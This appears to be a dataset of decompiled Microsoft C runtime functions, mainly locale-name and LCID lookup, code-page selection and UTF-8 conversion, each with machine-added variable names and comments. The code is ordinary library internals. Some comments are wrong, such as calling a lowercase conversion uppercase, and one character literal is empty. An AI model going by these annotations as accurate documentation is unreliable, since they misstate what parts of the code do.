{"Function Name": "__acrt_get_qualified_locale", "Address": "14001bbe0", "Source Code": "\nundefined8 __acrt_get_qualified_locale(short *locale_params, uint *code_page_output, LPWSTR locale_string)\n{\n    longlong *locale_pointer; // Pointer to a longlong variable\n    wchar_t *source_string;    // Source wide character string\n    wchar_t *destination_string;    // Destination wide character string\n    BOOL status_flag;       // Boolean variable for status\n    uint code_page_value;        // Variable to hold code page value\n    errno_t error_code;    // Error variable for function calls\n    int return_value;        // Integer variable for return values\n    longlong thread_local_storage_pointer;   // Local variable to hold thread-local storage pointer\n\n    thread_local_storage_pointer = __acrt_getptd(); // Get the thread-local storage pointer\n    locale_pointer = (longlong *)(thread_local_storage_pointer + 0x98); // Get pointer to locale data\n    *(undefined4 *)(thread_local_storage_pointer + 0xa8) = 0; // Initialize a specific locale-related variable to 0\n    source_string = (wchar_t *)(thread_local_storage_pointer + 0x2f0); // Set source to a specific location in thread-local storage\n    *source_string = L'\\0'; // Null-terminate the source string\n\n    // Check if a specific condition is met to translate the name\n    if (locale_params[0x40] != 0) {\n        TranslateName(0x14002c470, 0x16, locale_pointer); // Translate the name if condition is true\n    }\n\n    // Determine locale name based on parameters\n    if (*locale_params == 0 || locale_params[0x40] == 0) {\n        GetLocaleNameFromDefault(locale_pointer); // Get locale name from default if conditions are met\n    } else {\n        if (*(short *)*locale_pointer == 0) {\n            GetLocaleNameFromLanguage(locale_pointer); // Get locale name from language if locale data is empty\n        } else {\n            GetLocaleNameFromLangCountry(locale_pointer); // Get locale name from language and country\n        }\n    }\n\n    // Check if a specific locale-related variable is still 0\n    if (*(int *)(thread_local_storage_pointer + 0xa8) == 0) {\n        // Attempt to translate the name again\n        if (TranslateName(0x14002c050, 0x40, locale_pointer) != 0) {\n            if (*(short *)*locale_pointer == 0) {\n                GetLocaleNameFromLanguage(locale_pointer); // Get locale name from language if locale data is empty\n            } else {\n                GetLocaleNameFromLangCountry(locale_pointer); // Get locale name from language and country\n            }\n        }\n    }\n\n    // Determine the code page value based on parameters\n    code_page_value = (locale_params[0] == 0 && locale_params[0x80] == L'\\0') ? GetACP() : ProcessCodePage(locale_params + 0x80, (longlong)locale_pointer);\n\n    // Check if the code page value is valid\n    if (code_page_value != 0 && code_page_value != 65000 && IsValidCodePage(code_page_value & 0xffff)) {\n        if (code_page_output != (uint *)0x0) {\n            *code_page_output = code_page_value; // Store the code page value if param_2 is not null\n        }\n        if (locale_string != (LPWSTR)0x0) {\n            destination_string = locale_string + 0x90; // Set destination pointer to a specific offset in param_3\n            *destination_string = L'\\0'; // Null-terminate the destination string\n            longlong loop_counter = -1; // Initialize a loop counter\n            while (source_string[++loop_counter] != L'\\0'); // Find the length of the source string\n\n            // Copy the source string to the destination safely\n            error_code = wcsncpy_s(destination_string, 0x55, source_string, loop_counter + 2);\n            if (error_code != 0) {\n                _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke Watson if copy fails\n            }\n\n            // Get locale information and check conditions\n            return_value = __acrt_GetLocaleInfoEx(destination_string, 0x1001, locale_string, 0x40);\n            if (return_value != 0) {\n                return_value = __acrt_GetLocaleInfoEx(destination_string, 0x1002, locale_string + 0x40, 0x40);\n                if (return_value != 0 && (FUN_14001f950((ushort *)(locale_string + 0x40), 0x5f) == (ushort *)0x0 &&\n                    FUN_14001f950((ushort *)(locale_string + 0x40), 0x2e) == (ushort *)0x0 || \n                    __acrt_GetLocaleInfoEx(destination_string, 7, locale_string + 0x40, 0x40) != 0)) {\n                    // Check if the code page is not a specific value\n                    if (code_page_value != 0xfde9) {\n                        _itow_s(code_page_value, locale_string + 0x80, 0x10, 10); // Convert code page to string\n                        return 1; // Return success\n                    }\n                    error_code = wcsncpy_s(locale_string + 0x80, 0x10, L\"utf8\", 5); // Copy \"utf8\" to the destination\n                    if (error_code == 0) {\n                        return 1; // Return success if copy is successful\n                    }\n                }\n            }\n        }\n    }\n    return 0; // Return failure if conditions are not met\n}\n"}
{"Function Name": "FUN_14001be44", "Address": "14001be44", "Source Code": "\nvoid FUN_14001be44(ushort *localeHexString) // Function definition with a parameter of type ushort pointer\n{\n    uint *localePointer; // Pointer to an unsigned integer\n    LCID localeIdentifier; // Variable to hold the locale identifier\n    int localeInfoResult; // Variable to hold the return value of GetLocaleInfoW\n    longlong threadLocalStoragePointer; // Variable to hold the thread-local storage pointer\n    short *localeDataPointer; // Pointer to a short\n    uint localeCheckCounter; // Counter variable\n    undefined1 undefinedDataStack [32]; // Stack space for undefined data\n    WCHAR localeInfoArray [120]; // Array to hold locale information as wide characters\n    ulonglong securityCookie; // Variable to hold a security cookie\n\n    // XOR operation to initialize local_18 with a security cookie\n    securityCookie = DAT_140038080 ^ (ulonglong)undefinedDataStack;\n    \n    // Get the pointer to the thread-local data\n    threadLocalStoragePointer = __acrt_getptd();\n    \n    // Retrieve the pointer to the locale data\n    localePointer = *(uint **)(threadLocalStoragePointer + 0x3a0);\n    \n    // Convert the hex string to a locale identifier\n    localeIdentifier = LcidFromHexString(localeHexString);\n    \n    // Get locale information and store it in local_108\n    localeInfoResult = GetLocaleInfoW(localeIdentifier, 0x1002 - (uint)(*(int *)(threadLocalStoragePointer + 0xb4) != 0), localeInfoArray, 0x78);\n    localeCheckCounter = 0; // Initialize counter\n\n    // Check if GetLocaleInfoW failed\n    if (localeInfoResult == 0) {\n        *localePointer = 0; // Set the first element of puVar1 to 0 if failed\n    } else {\n        // Compare the retrieved locale information with the stored locale\n        localeInfoResult = _wcsicmp(*(wchar_t **)(threadLocalStoragePointer + 0xa0), localeInfoArray);\n        if (localeInfoResult == 0) { // If they are equal\n            localeDataPointer = &DAT_14002d008; // Initialize psVar5 to point to a specific data location\n            do {\n                // Check if the current locale matches the value in psVar5\n                if ((short)localeIdentifier == *localeDataPointer) goto LAB_14001bf03; // If match, jump to cleanup\n                localeCheckCounter++; // Increment the counter\n                localeDataPointer++; // Move to the next entry\n            } while (localeCheckCounter < 10); // Loop until 10 entries are checked\n            \n            *localePointer |= 4; // Set the 3rd bit of puVar1\n            localePointer[1] = localeIdentifier; // Store the locale in the second element of puVar1\n            localePointer[2] = localeIdentifier; // Store the locale in the third element of puVar1\n        }\n    }\nLAB_14001bf03: // Cleanup label\n    // Perform a security check using the security cookie\n    __security_check_cookie(securityCookie ^ (ulonglong)undefinedDataStack);\n    return; // Exit the function\n}\n"}
{"Function Name": "GetLcidFromLangCountry", "Address": "14001bf2c", "Source Code": "\nvoid GetLcidFromLangCountry(uint *param_1)\n{\n    longlong threadDataPtr; // Variable to hold the pointer to the thread data\n    longlong localeCount; // Variable to count the number of locales\n    longlong languageCount; // Variable to count the number of languages\n    int languageIndex;      // Variable to hold the index for language processing\n    threadDataPtr = __acrt_getptd(); // Get the pointer to the thread data\n    localeCount = -1; // Initialize locale count to -1\n    languageCount = -1; // Initialize language count to -1\n    languageIndex = 0;  // Initialize index for language processing\n    \n    // Count the number of languages until a null terminator is found\n    do {\n        languageCount++;\n    } while (*(short *)(*(longlong *)(threadDataPtr + 0x98) + languageCount * 2) != 0);\n    \n    // Store the result of whether there are exactly 3 languages\n    *(uint *)(threadDataPtr + 0xb0) = (uint)(languageCount == 3);\n    \n    // Count the number of locales until a null terminator is found\n    do {\n        localeCount++;\n    } while (*(short *)(*(longlong *)(threadDataPtr + 0xa0) + localeCount * 2) != 0);\n    \n    // Store the result of whether there are exactly 3 locales\n    *(uint *)(threadDataPtr + 0xb4) = (uint)(localeCount == 3);\n    param_1[1] = 0; // Initialize the second element of param_1 to 0\n    int initialValue = 2;  // Initialize iVar5 to 2 for later use\n    \n    // If there are not 3 languages, process the languages\n    if (*(int *)(threadDataPtr + 0xb0) == 0) {\n        short *languagePtr = *(short **)(threadDataPtr + 0x98); // Pointer to the languages\n        while (true) {\n            short currentLanguageChar = *languagePtr++; // Get the current language character\n            // Check if the character is not a valid alphabet character\n            if ((0x19 < (ushort)(currentLanguageChar - 0x41U)) && (0x19 < (ushort)(currentLanguageChar - 0x61U)))\n                break; // Exit the loop if an invalid character is found\n            languageIndex++; // Increment the index for valid characters\n        }\n    }\n    \n    // Store the value of iVar5 in the thread data\n    *(int *)(threadDataPtr + 0xac) = initialValue;\n    EnumSystemLocalesW(FUN_14001c094, 1); // Enumerate system locales with a callback function\n    \n    // Check if the LCID is valid based on certain bit conditions\n    if ((*param_1 >> 8 & 1) == 0 || ((*param_1 & 7) == 0 || (*param_1 >> 9 & 1) == 0)) {\n        *param_1 = 0; // Reset param_1 to 0 if the conditions are met\n    }\n}\n"}
{"Function Name": "GetLcidFromLanguage", "Address": "14001bffc", "Source Code": "\nvoid GetLcidFromLanguage(byte *languageFlags)\n{\n    longlong threadDataPtr; // Variable to store the pointer to the thread data\n    int statusFlag; // Variable to store an integer value\n    short *languageStringPtr; // Pointer to a short (string) for language\n    longlong languageStringIndex; // Variable to track the index of the language string\n    int characterCount; // Variable to count characters in the language string\n\n    threadDataPtr = __acrt_getptd(); // Get the pointer to the thread data\n    languageStringIndex = -1; // Initialize index for language string\n    characterCount = 0; // Initialize character count\n    languageStringPtr = *(short **)(threadDataPtr + 0x98); // Get the language string from thread data\n    \n    // Loop to find the length of the language string\n    while (languageStringPtr[++languageStringIndex] != 0);\n    \n    // Store a flag indicating if the language string length is 3\n    *(uint *)(threadDataPtr + 0xb0) = (uint)(languageStringIndex == 3);\n    statusFlag = 2; // Initialize iVar3 to 2\n\n    // If the language string length is not 3, process the string\n    if (languageStringIndex != 3) {\n        while (true) {\n            // Check if the current character is a valid alphabetic character\n            if ((0x19 < (ushort)(*languageStringPtr - 0x41U)) && (0x19 < (ushort)(*languageStringPtr - 0x61U)))\n                break; // Exit loop if character is not valid\n            languageStringPtr++; // Move to the next character\n            characterCount++; // Increment character count\n        }\n    }\n    \n    *(int *)(threadDataPtr + 0xac) = statusFlag; // Store iVar3 in thread data\n    EnumSystemLocalesW(FUN_14001c2e0, 1); // Enumerate system locales with a callback function\n    \n    // If the 3rd bit of param_1 is not set, clear the first four bytes of param_1\n    if ((*languageFlags & 4) == 0) {\n        languageFlags[0] = 0; // Clear first byte\n        languageFlags[1] = 0; // Clear second byte\n        languageFlags[2] = 0; // Clear third byte\n        languageFlags[3] = 0; // Clear fourth byte\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_14001c094", "Address": "14001c094", "Source Code": "\nvoid FUN_14001c094(ushort *locale_param)\n{\n    longlong *longlong_ptr; // Pointer to a longlong variable\n    uint *uint_ptr; // Pointer to a uint variable\n    uint locale_id; // Variable to store the locale\n    int return_value; // Variable to store return values from functions\n    longlong thread_local_data; // Variable to store a longlong value\n    short *short_ptr; // Pointer to a short variable\n    uint uint_value; // Variable to store a uint value\n    undefined1 undefined_data [32]; // Stack space for undefined data\n    WCHAR locale_info [120]; // Array to store locale information\n    ulonglong security_check_value = DAT_140038080 ^ (ulonglong)undefined_data; // Local variable for security check\n\n    thread_local_data = __acrt_getptd(); // Get the thread-local data pointer\n    longlong_ptr = (longlong *)(thread_local_data + 0x98); // Get a pointer to a specific longlong variable in thread-local storage\n    uint_ptr = *(uint **)(thread_local_data + 0x3a0); // Get a pointer to a uint variable in thread-local storage\n    locale_id = LcidFromHexString(locale_param); // Convert hex string to locale ID\n    return_value = GetLocaleInfoW(locale_id, 0x1002, locale_info, 0x78); // Get locale information\n\n    if (return_value != 0) { // Check if locale information was retrieved successfully\n        return_value = _wcsicmp(*(wchar_t **)(thread_local_data + 0xa0), locale_info); // Compare locale names\n        if (return_value != 0) { // If names are different\n            return_value = GetLocaleInfoW(locale_id, 0x1001, locale_info, 0x78); // Get another locale information\n            if (return_value != 0) { // Check if the information was retrieved successfully\n                return_value = _wcsicmp((wchar_t *)*longlong_ptr, locale_info); // Compare with another locale name\n                uint_value = *uint_ptr; // Store current value of puVar2\n                if (return_value == 0) { // If names are the same\n                    uint_value |= 0x304; // Update uVar9 with a bitwise OR operation\n                    uint_ptr[1] = locale_id; // Store the locale in puVar2[1]\n                    uint_ptr[2] = locale_id; // Store the locale in puVar2[2]\n                    *uint_ptr = uint_value; // Update puVar2 with the new value\n                } else if ((uint_value & 2) == 0 && *(int *)(thread_local_data + 0xac) != 0) { // Check conditions for further comparison\n                    return_value = _wcsnicmp((wchar_t *)*longlong_ptr, locale_info, *(int *)(thread_local_data + 0xac)); // Compare with a specified number of characters\n                    if (return_value == 0) { // If they match\n                        uint_ptr[2] = locale_id; // Store the locale in puVar2[2]\n                        *uint_ptr = uint_value | 2; // Update puVar2 with a bitwise OR operation\n                        longlong counter = 0; // Initialize a counter\n                        while (*(short *)(*longlong_ptr + counter * 2) != 0) { // Count characters until null terminator\n                            counter++;\n                        }\n                        if ((int)counter == *(int *)(thread_local_data + 0xac)) { // Check if the count matches\n                            uint_ptr[1] = locale_id; // Store the locale in puVar2[1]\n                        }\n                    }\n                }\n                if ((uint_value & 1) == 0) { // Check if a specific bit is not set\n                    uint array_counter = 0; // Initialize a counter\n                    short_ptr = &predefined_short_array; // Pointer to a predefined short array\n                    while (array_counter < 10) { // Loop through the array\n                        if ((short)locale_id == *short_ptr) { // Check if the locale matches an entry in the array\n                            goto LAB_14001c1e3; // Jump to the label if a match is found\n                        }\n                        array_counter++; // Increment the counter\n                        short_ptr++; // Move to the next element in the array\n                    }\n                    uint_value |= 1; // Set the specific bit in uVar9\n                    uint_ptr[2] = locale_id; // Store the locale in puVar2[2]\n                    *uint_ptr = uint_value; // Update puVar2 with the new value\n                }\n            }\n        }\n    }\nLAB_14001c1e3: // Label for jump\n    if ((*uint_ptr & 0x300) == 0x300) { // Check if specific bits are set in puVar2\n        return_value = GetLocaleInfoW(locale_id, 0x1001, locale_info, 0x78); // Get another locale information\n        if (return_value != 0) { // Check if the information was retrieved successfully\n            return_value = _wcsicmp((wchar_t *)*longlong_ptr, locale_info); // Compare with another locale name\n            if (return_value == 0) { // If names are the same\n                uint_value = *uint_ptr; // Store current value of puVar2\n                *uint_ptr = uint_value | 0x200; // Update puVar2 with a bitwise OR operation\n                if (*(int *)(thread_local_data + 0xb0) == 0 && *(int *)(thread_local_data + 0xac) != 0) { // Check conditions for further comparison\n                    longlong character_counter = 0; // Initialize a counter\n                    while (*(short *)(*longlong_ptr + character_counter * 2) != 0) { // Count characters until null terminator\n                        character_counter++;\n                    }\n                    if ((int)character_counter == *(int *)(thread_local_data + 0xac)) { // Check if the count matches\n                        return_value = 1; // Set iVar3 to 1\n                        goto LAB_14001c287; // Jump to the label\n                    }\n                }\n                *uint_ptr = uint_value | 0x300; // Update puVar2 with the new value\n            } else { // If names are different\n                if ((*(int *)(thread_local_data + 0xb0) == 0) && (*(int *)(thread_local_data + 0xac) != 0) && \n                    (return_value = _wcsicmp((wchar_t *)*longlong_ptr, locale_info), return_value == 0)) { // Check conditions for further comparison\n                    return_value = 0; // Set iVar3 to 0\n                } else {\n                    goto LAB_14001c2b6; // Jump to the label\n                }\nLAB_14001c287: // Label for jump\n                uint default_language_test = TestDefaultLanguage(locale_id, return_value); // Test the default language\n                if ((int)default_language_test == 0) { // Check if the test failed\n                    goto LAB_14001c2b6; // Jump to the label\n                }\n                *uint_ptr |= 0x100; // Set a specific bit in puVar2\n            }\n            if (uint_ptr[1] == 0) { // Check if puVar2[1] is zero\n                uint_ptr[1] = locale_id; // Store the locale in puVar2[1]\n            }\n        }\n    }\nLAB_14001c2b6: // Label for jump\n    __security_check_cookie(security_check_value ^ (ulonglong)undefined_data); // Security check\n    return; // Return from the function\n}\n"}
{"Function Name": "FUN_14001c2e0", "Address": "14001c2e0", "Source Code": "\nvoid FUN_14001c2e0(ushort *param_1)\n{\n    uint *uintPointer; // Pointer to a uint variable\n    uint localeIdentifier; // Variable to store the locale\n    int returnValue; // Variable to store return values from functions\n    longlong threadDataPointer1; // Variable to hold thread-local storage pointer\n    longlong threadDataPointer2; // Variable to hold thread-local storage pointer\n    undefined8 testResult; // Variable to store the result of TestDefaultLanguage\n    WCHAR localeBuffer[120]; // Buffer to hold locale information\n    ulonglong securityCookie = DAT_140038080 ^ (ulonglong)localeBuffer; // Security cookie for stack protection\n\n    threadDataPointer1 = __acrt_getptd(); // Get pointer to thread data\n    threadDataPointer2 = __acrt_getptd(); // Get pointer to thread data again\n    uintPointer = *(uint **)(threadDataPointer2 + 0x3a0); // Retrieve a pointer to a uint from thread data\n    localeIdentifier = LcidFromHexString(param_1); // Convert hex string to locale identifier\n    returnValue = GetLocaleInfoW(localeIdentifier, (-(uint)(*(int *)(threadDataPointer1 + 0xb0) != 0) & 0xfffff002) + 0x1001, localeBuffer, 0x78); // Get locale information\n\n    if (returnValue == 0) { // Check if GetLocaleInfoW failed\n        *uintPointer = 0; // Set the value pointed by puVar1 to 0\n        goto LAB_14001c3c3; // Jump to cleanup\n    }\n    \n    returnValue = _wcsicmp(*(wchar_t **)(threadDataPointer1 + 0x98), localeBuffer); // Compare locale strings\n    if (returnValue == 0) { // If the strings are equal\n        if (*(int *)(threadDataPointer1 + 0xb0) == 0) { // Check if a specific condition is met\n            returnValue = 1; // Set iVar2 to 1\n            goto LAB_14001c3a2; // Jump to further processing\n        }\n    } else { // If the strings are not equal\n        if ((*(int *)(threadDataPointer1 + 0xb0) != 0) || (*(int *)(threadDataPointer1 + 0xac) == 0) || (returnValue = _wcsicmp(*(wchar_t **)(threadDataPointer1 + 0x98), localeBuffer), returnValue != 0)) {\n            goto LAB_14001c3c3; // Jump to cleanup if conditions are met\n        }\n        returnValue = 0; // Set iVar2 to 0\n    }\n    \nLAB_14001c3a2: // Label for further processing\n    testResult = TestDefaultLanguage(localeIdentifier, returnValue); // Test if the default language matches\n    if ((int)testResult == 0) { // If the test fails\n        goto LAB_14001c3c3; // Jump to cleanup\n    }\n    \n    *uintPointer = *uintPointer | 4; // Set a flag in the value pointed by puVar1\n    uintPointer[1] = localeIdentifier; // Store the locale in the second position\n    uintPointer[2] = localeIdentifier; // Store the locale in the third position\n\nLAB_14001c3c3: // Cleanup label\n    __security_check_cookie(securityCookie); // Check the security cookie\n    return; // Exit the function\n}\n"}
{"Function Name": "LcidFromHexString", "Address": "14001c3e8", "Source Code": "\nint LcidFromHexString(ushort *hexString)\n{\n    ushort currentCharValue; // Variable to hold the current character value\n    int finalResult = 0; // Variable to accumulate the final integer result\n    \n    // Loop through each character in the input string until a null terminator is found\n    while ((currentCharValue = *hexString) != 0) {\n        hexString++; // Move to the next character in the string\n        \n        // Check if the character is a lowercase letter (a-f)\n        if ((ushort)(currentCharValue - 0x61) < 6) {\n            currentCharValue -= 0x27; // Convert lowercase letter to its numeric value (10-15)\n        } \n        // Check if the character is an uppercase letter (A-F)\n        else if ((ushort)(currentCharValue - 0x41) < 6) {\n            currentCharValue -= 7; // Convert uppercase letter to its numeric value (10-15)\n        }\n        \n        // Update the result by shifting left and adding the current numeric value\n        finalResult = finalResult * 0x10 + (uint)currentCharValue - 0x30; // Convert character to integer and accumulate\n    }\n    \n    return finalResult; // Return the final accumulated integer value\n}\n"}
{"Function Name": "ProcessCodePage", "Address": "14001c438", "Source Code": "\nUINT ProcessCodePage(wchar_t *localeString, longlong localeData)\n{\n    UINT resultCode; // Variable to store the result\n    UINT localeInfo[2]; // Array to hold locale information\n    \n    // Check if param_1 is NULL, empty, or equals \"ACP\"\n    if (localeString == (wchar_t *)0x0 || *localeString == L'\\0' || wcscmp(localeString, L\"ACP\") == 0) {\n        // Retrieve the code page information for the current locale\n        if (GetLocaleInfoW(*(LCID *)(localeData + 8), 0x20001004, (LPWSTR)localeInfo, 2) != 0) {\n            // Check if the retrieved code page is valid\n            if (localeInfo[0] != 0) {\n                return localeInfo[0]; // Return the valid code page\n            }\n            return GetACP(); // Return the default ANSI code page if no valid code page is found\n        }\n    } \n    // Check if param_1 is not equal to \"OCP\"\n    else if (wcscmp(localeString, L\"OCP\") != 0) {\n        return _wtol(localeString); // Convert the wide string to a long integer and return\n    } \n    // If param_1 is \"OCP\"\n    else {\n        // Retrieve the OCP information for the current locale\n        if (GetLocaleInfoW(*(LCID *)(localeData + 8), 0x2000000b, (LPWSTR)localeInfo, 2) != 0) {\n            return localeInfo[0]; // Return the OCP code page\n        }\n    }\n    \n    return 0; // Return 0 if no valid code page is found\n}\n"}
{"Function Name": "TestDefaultLanguage", "Address": "14001c4e8", "Source Code": "\nundefined8 TestDefaultLanguage(uint locale_id, int check_param)\n{\n    int locale_info_result; // Variable to store the result of GetLocaleInfoW\n    longlong thread_data_pointer; // Variable to hold the pointer to the thread data\n    undefined8 return_value; // Variable to store the return value\n    short *locale_name_pointer; // Pointer to a short (wide character) string\n    thread_data_pointer = __acrt_getptd(); // Get the pointer to the thread data\n    locale_info_result = GetLocaleInfoW(locale_id & 0x3ff | 0x400, 0x20000001, (LPWSTR)&locale_info_buffer, 2); // Retrieve locale information\n    if (locale_info_result == 0) { // Check if GetLocaleInfoW failed\n        return_value = 0; // Set return value to 0 if failed\n    } else {\n        if ((locale_id != locale_info_buffer[0]) && (check_param != 0)) { // Check if the locale ID is different and param_2 is not zero\n            locale_name_pointer = *(short **)(thread_data_pointer + 0x98); // Get the pointer to the locale name\n            int alphabetic_count = 0; // Initialize count of alphabetic characters\n            while (*locale_name_pointer != 0) { // Loop through the locale name until null terminator\n                if ((*locale_name_pointer >= 0x41 && *locale_name_pointer <= 0x5A) || (*locale_name_pointer >= 0x61 && *locale_name_pointer <= 0x7A)) { // Check if character is alphabetic\n                    alphabetic_count++; // Increment count for each alphabetic character\n                }\n                locale_name_pointer++; // Move to the next character\n            }\n            if (alphabetic_count == (int)(locale_name_pointer - *(short **)(thread_data_pointer + 0x98))) { // Check if all characters are alphabetic\n                return_value = 0; // Set return value to 0 if all are alphabetic\n            } else {\n                return_value = 1; // Set return value to 1 if there are non-alphabetic characters\n            }\n        } else {\n            return_value = 1; // Set return value to 1 if locale ID is the same or param_2 is zero\n        }\n    }\n    return return_value; // Return the final result\n}\n"}
{"Function Name": "TranslateName", "Address": "14001c594", "Source Code": "\nulonglong TranslateName(longlong string_base, int upper_bound, longlong *result_pointer)\n{\n    int middle_index; // Variable to hold the middle index for binary search\n    int lower_bound = 0; // Starting index for binary search\n    ulonglong comparison_result; // Variable to store the result of string comparison\n\n    // Check if param_2 is non-negative\n    if (upper_bound >= 0) {\n        do {\n            // Calculate the middle index for the current search range\n            middle_index = (lower_bound + upper_bound) / 2;\n            // Compare the string at the current index with the target string\n            int comparison_value = _wcsicmp((wchar_t *)*result_pointer, *(wchar_t **)((longlong)middle_index * 0x10 + string_base));\n            comparison_result = (ulonglong)comparison_value; // Store the result of the comparison\n\n            // If the strings are equal\n            if (comparison_value == 0) {\n                // Update param_3 to point to the found string's address\n                *result_pointer = string_base + 8 + (longlong)middle_index * 0x10;\n                // Return the address with a flag indicating success\n                return CONCAT71((int7)((ulonglong)*result_pointer >> 8), 1);\n            }\n            // If the target string is less than the current string\n            if (comparison_value < 0) {\n                upper_bound = middle_index - 1; // Adjust the upper bound for the search\n            } else {\n                lower_bound = middle_index + 1; // Adjust the lower bound for the search\n            }\n        } while (lower_bound <= upper_bound); // Continue searching while bounds are valid\n    }\n    // Return the comparison result masked to indicate no match found\n    return comparison_result & 0xffffffffffffff00;\n}\n"}
{"Function Name": "GetTableIndexFromLocaleName", "Address": "14001c894", "Source Code": "\nint __cdecl GetTableIndexFromLocaleName(wchar_t *locale_name)\n{\n    int index_adjustment; // Variable to store the index for binary search adjustment\n    int midpoint_index; // Midpoint index for binary search\n    ushort current_character; // Variable to hold the current character comparison value\n    ushort *locale_entry_pointer; // Pointer to the current locale name entry in the table\n    longlong comparison_limit; // Counter for character comparison loop\n    int lower_bound_index = 0; // Lower bound index for binary search\n    int upper_bound_index = 0xe3; // Upper bound index for binary search\n\n    while (true) {\n        comparison_limit = 0x55; // Set the character comparison limit\n        midpoint_index = (upper_bound_index + lower_bound_index) / 2; // Calculate the midpoint index\n        locale_entry_pointer = (ushort *)(&PTR_DAT_14002ea80)[(longlong)midpoint_index * 2]; // Get the locale name at midpoint\n        longlong offset = (longlong)locale_name - (longlong)locale_entry_pointer; // Calculate the offset from the current locale name\n\n        do {\n            current_character = *(short *)(offset + (longlong)locale_entry_pointer) + 0x20; // Get the current character and convert to uppercase\n            if (0x19 < (ushort)(*(short *)(offset + (longlong)locale_entry_pointer) - 0x41U)) { // Check if character is below 'A'\n                current_character = *(ushort *)(offset + (longlong)locale_entry_pointer); // Use original character if it's not a letter\n            }\n            ushort locale_character = *locale_entry_pointer + 0x20; // Get the locale name character and convert to uppercase\n            if (0x19 < (ushort)(*locale_entry_pointer - 0x41)) { // Check if character is below 'A'\n                locale_character = *locale_entry_pointer; // Use original character if it's not a letter\n            }\n            locale_entry_pointer++; // Move to the next character in the locale name\n            comparison_limit--; // Decrement the character comparison limit\n        } while (comparison_limit != 0 && current_character != 0 && current_character == locale_character); // Continue comparing characters until limit or mismatch\n\n        if ((uint)current_character == (uint)locale_character) break; // If characters match, exit the loop\n\n        index_adjustment = midpoint_index + (current_character < locale_character ? 0 : -1); // Adjust index based on comparison result\n        upper_bound_index = index_adjustment; // Update upper bound index\n        if (current_character < locale_character) { // If current character is less than the locale name character\n            lower_bound_index = midpoint_index + 1; // Update lower bound index\n        }\n        if (upper_bound_index < lower_bound_index) { // If bounds cross, return -1 indicating not found\n            return -1;\n        }\n    }\n    return *(int *)(&DAT_14002ea88 + (longlong)midpoint_index * 0x10); // Return the found index from the table\n}\n"}
{"Function Name": "__acrt_DownlevelLCIDToLocaleName", "Address": "14001c97c", "Source Code": "\nint __acrt_DownlevelLCIDToLocaleName(uint locale_id, wchar_t *locale_name_buffer, int buffer_size)\n{\n    int lower_bound, mid_index, comparison_result, upper_bound = 0, search_upper_bound = 0xe3; // Variable declarations\n    errno_t copy_error; // Error variable for string copy\n    ulonglong locale_name_length; // Variable to hold the result of FUN_1400121a8\n\n    // Check if param_1 is valid and param_2 is not null or param_3 is less than 1\n    if (((((locale_id & 0xfffff3ff) != 0) || (locale_id == 0xc00)) &&\n        ((locale_name_buffer != (wchar_t *)0x0 || (buffer_size < 1)))) && (-1 < buffer_size)) {\n        \n        // Binary search to find the appropriate index\n        do {\n            mid_index = (search_upper_bound + upper_bound) / 2; // Calculate mid index\n            comparison_result = locale_id - *(uint *)(&DAT_14002d020 + (longlong)mid_index * 0x10); // Compare with value at mid index\n            if (locale_id == *(uint *)(&DAT_14002d020 + (longlong)mid_index * 0x10)) goto LAB_14001ca06; // Found exact match\n            lower_bound = mid_index + -1; // Set iVar1 to one less than mid index\n            if (-1 < comparison_result) {\n                lower_bound = search_upper_bound; // Adjust iVar1 if value is greater\n            }\n            search_upper_bound = lower_bound; // Update upper bound\n            if (-1 < comparison_result) {\n                upper_bound = mid_index + 1; // Update lower bound\n            }\n        } while (upper_bound <= search_upper_bound); // Continue until bounds converge\n        mid_index = -1; // Set iVar2 to -1 if not found\n    LAB_14001ca06:\n        // If a valid index was found\n        if (-1 < mid_index) {\n            undefined1 (*source_data)[32] = (undefined1 (*)[32])(&PTR_DAT_14002d028)[(longlong)mid_index * 2]; // Get the source data\n            locale_name_length = FUN_1400121a8(source_data, 0x55); // Call function to get the length of the locale name\n            if (0 < buffer_size) { // Check if buffer size is positive\n                if (buffer_size <= (int)locale_name_length) { // Check if buffer is too small\n                    return 0; // Return 0 if buffer is insufficient\n                }\n                copy_error = wcscpy_s(locale_name_buffer, (longlong)buffer_size, (wchar_t *)source_data); // Copy the locale name to the buffer\n                if (copy_error != 0) { // Check for errors during copy\n                    _invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n                }\n            }\n            return (int)locale_name_length + 1; // Return the length of the locale name plus one\n        }\n    }\n    return 0; // Return 0 if no valid locale name was found\n}\n"}
{"Function Name": "__acrt_DownlevelLocaleNameToLCID", "Address": "14001ca70", "Source Code": "\nundefined4 __acrt_DownlevelLocaleNameToLCID(wchar_t *locale_name)\n{\n    uint locale_index; // Variable to hold the index of the locale name\n    // Check if the input locale name is not null and get its index\n    if (locale_name != (wchar_t *)0x0 && (locale_index = GetTableIndexFromLocaleName(locale_name), locale_index < 0xe4)) {\n        // Return the corresponding LCID from the data table if the index is valid\n        return *(undefined4 *)(&DAT_14002d020 + (longlong)(int)locale_index * 0x10);\n    }\n    // Return 0 if the input is null or the index is out of range\n    return 0;\n}\n"}
{"Function Name": "__crt_mbstring::__mbrtowc_utf8", "Address": "14001caa4", "Source Code": "\n__uint64 __cdecl\n__crt_mbstring::__mbrtowc_utf8(wchar_t *param_1, char *param_2, __uint64 param_3, _Mbstatet *param_4)\n{\n    wchar32 local_18[4]; // Local array to hold converted wide character\n    __uint64 _Var1 = __mbrtoc32_utf8(local_18, param_2, param_3, param_4); // Convert multi-byte string to wide character\n\n    if (_Var1 < 5) { // Check if conversion was successful (less than 5 indicates valid conversion)\n        if (0xffff < (uint)local_18[0]) { // Check if the converted character is a valid wide character\n            local_18[0] = L''; // Replace invalid character with replacement character\n        }\n        if (param_1 != (wchar_t *)0x0) { // Check if output pointer is not null\n            *param_1 = (wchar_t)local_18[0]; // Store the converted wide character in the output parameter\n        }\n    }\n\n    return _Var1; // Return the number of bytes processed\n}\n"}
